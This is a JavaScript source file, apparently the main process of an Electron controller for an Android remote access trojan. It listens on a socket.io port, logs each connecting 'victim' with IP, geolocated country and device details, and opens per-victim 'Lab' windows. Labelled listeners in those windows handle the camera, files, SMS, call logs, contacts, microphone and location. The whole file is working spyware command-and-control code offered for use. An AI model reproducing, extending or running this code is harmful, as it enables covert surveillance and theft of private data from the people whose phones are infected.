const { app, BrowserWindow } = require('electron')
const electron = require('electron');
const { ipcMain } = require('electron');
var io = require('socket.io');
var geoip = require('geoip-lite');
var victimsList = require('./app/assets/js/model/Victim');
module.exports = victimsList;
//--------------------------------------------------------------
let win;
let display;
var windows = {};
var IO;
//--------------------------------------------------------------

function createWindow() {


  // get Display Sizes ( x , y , width , height)
  display = electron.screen.getPrimaryDisplay();



  //------------------------SPLASH SCREEN INIT------------------------------------
  // create the splash window
  let splashWin = new BrowserWindow({
    width: 600,
    height: 400,
    frame: false,
    transparent: true,
    icon: __dirname + '/app/assets/img/icon.png',
    type: "splash",
    alwaysOnTop: true,
    show: false,
    position: "center",
    resizable: false,
    toolbar: false,
    fullscreen: false,
    webPreferences: {
      nodeIntegration: true
    }
  });


  // load splash file
  splashWin.loadURL('file://' + __dirname + '/app/splash.html');

  splashWin.webContents.on('did-finish-load', function () {
    splashWin.show(); //close splash
  });


  // Emitted when the window is closed.
  splashWin.on('closed', () => {
    // Dereference the window object
    splashWin = null
  })


  //------------------------Main SCREEN INIT------------------------------------
  // Create the browser window.
  win = new BrowserWindow({
    icon: __dirname + '/app/assets/img/icon.png',
    width: 800,
    height: 600,
    show: false,
    resizable: false,
    position: "center",
    toolbar: false,
    fullscreen: false,
    transparent: true,
    frame: false,
    webPreferences: {
      nodeIntegration: true
    }
  });

  win.loadURL('file://' + __dirname + '/app/index.html');
  //open dev tools
  //win.webContents.openDevTools()

  // Emitted when the window is closed.
  win.on('closed', () => {
    // Dereference the window object, usually you would store windows
    // in an array if your app supports multi windows, this is the time
    // when you should delete the corresponding element.
    win = null
  })

  // Emitted when the window is finished loading.
  win.webContents.on('did-finish-load', function () {
    setTimeout(() => {
      splashWin.close(); //close splash
      win.show(); //show main
    }, 2000);
  });
}



// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
app.on('ready', createWindow)

// Quit when all windows are closed.
app.on('window-all-closed', () => {
  // On macOS it is common for applications and their menu bar
  // to stay active until the user quits explicitly with Cmd + Q
  if (process.platform !== 'darwin') {
    app.quit()
  }
})

app.on('activate', () => {
  // On macOS it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  if (win === null) {
    createWindow()
  }
})



//handle the Uncaught Exceptions



// fired when start listening
// It will be fired when AppCtrl emit this event
ipcMain.on('SocketIO:Listen', function (event, port) {

  IO = io.listen(port);
  IO.sockets.pingInterval = 10000;
  IO.sockets.on('connection', function (socket) {
    // Get victim info
    var address = socket.request.connection;
    var query = socket.handshake.query;
    var index = query.id;
    var ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
    var country = null;
    var geo = geoip.lookup(ip); // check ip location
    if (geo)
      country = geo.country.toLowerCase();

    // Add the victim to victimList
    victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);


    //------------------------Notification SCREEN INIT------------------------------------
    // create the Notification window
    let notification = new BrowserWindow({
      frame: false,
      x: display.bounds.width - 280,
      y: display.bounds.height - 78,
      show: false,
      width: 280,
      height: 78,
      resizable: false,
      toolbar: false,
      webPreferences: {
        nodeIntegration: true
      }
    });

    // Emitted when the window is finished loading.
    notification.webContents.on('did-finish-load', function () {
      notification.show();
      setTimeout(function () { notification.destroy() }, 3000);
    });

    notification.webContents.victim = victimsList.getVictim(index);
    notification.loadURL('file://' + __dirname + '/app/notification.html');



    //notify renderer proccess (AppCtrl) about the new Victim
    win.webContents.send('SocketIO:NewVictim', index);

    socket.on('disconnect', function () {
      // Decrease the socket count on a disconnect
      victimsList.rmVictim(index);

      //notify renderer proccess (AppCtrl) about the disconnected Victim
      win.webContents.send('SocketIO:RemoveVictim', index);

      if (windows[index]) {
        //notify renderer proccess (LabCtrl) if opened about the disconnected Victim
        BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:VictimDisconnected");
        //delete the window from windowsList
        delete windows[index]
      }
    });

  });

});


//handle the Uncaught Exceptions
process.on('uncaughtException', function (error) {

  if (error.code == "EADDRINUSE") {
    win.webContents.send('SocketIO:Listen', "Address Already in Use");
  } else {
    electron.dialog.showErrorBox("ERROR", JSON.stringify(error));
  }

});



// Fired when Victim's Lab is opened
ipcMain.on('openLabWindow', function (e, page, index) {
  //------------------------Lab SCREEN INIT------------------------------------
  // create the Lab window
  let child = new BrowserWindow({
    icon: __dirname + '/app/assets/img/icon.png',
    parent: win,
    width: 600,
    height: 650,
    darkTheme: true,
    transparent: true,
    resizable: false,
    frame: false,
    webPreferences: {
      nodeIntegration: true
    }
  })

  //add this window to windowsList
  windows[index] = child.id;
  //child.webContents.openDevTools();

  // pass the victim info to this victim lab
  child.webContents.victim = victimsList.getVictim(index).socket;
  child.loadURL('file://' + __dirname + '/app/' + page)

  child.once('ready-to-show', () => {
    child.show();
  });

  child.on('closed', () => {
    delete windows[index];
    //on lab window closed remove all socket listners
    if (victimsList.getVictim(index).socket) {
      victimsList.getVictim(index).socket.removeAllListeners("x0000ca"); // camera
      victimsList.getVictim(index).socket.removeAllListeners("x0000fm"); // file manager
      victimsList.getVictim(index).socket.removeAllListeners("x0000sm"); // sms
      victimsList.getVictim(index).socket.removeAllListeners("x0000cl"); // call logs
      victimsList.getVictim(index).socket.removeAllListeners("x0000cn"); // contacts
      victimsList.getVictim(index).socket.removeAllListeners("x0000mc"); // mic
      victimsList.getVictim(index).socket.removeAllListeners("x0000lm"); // location
    }
  })
});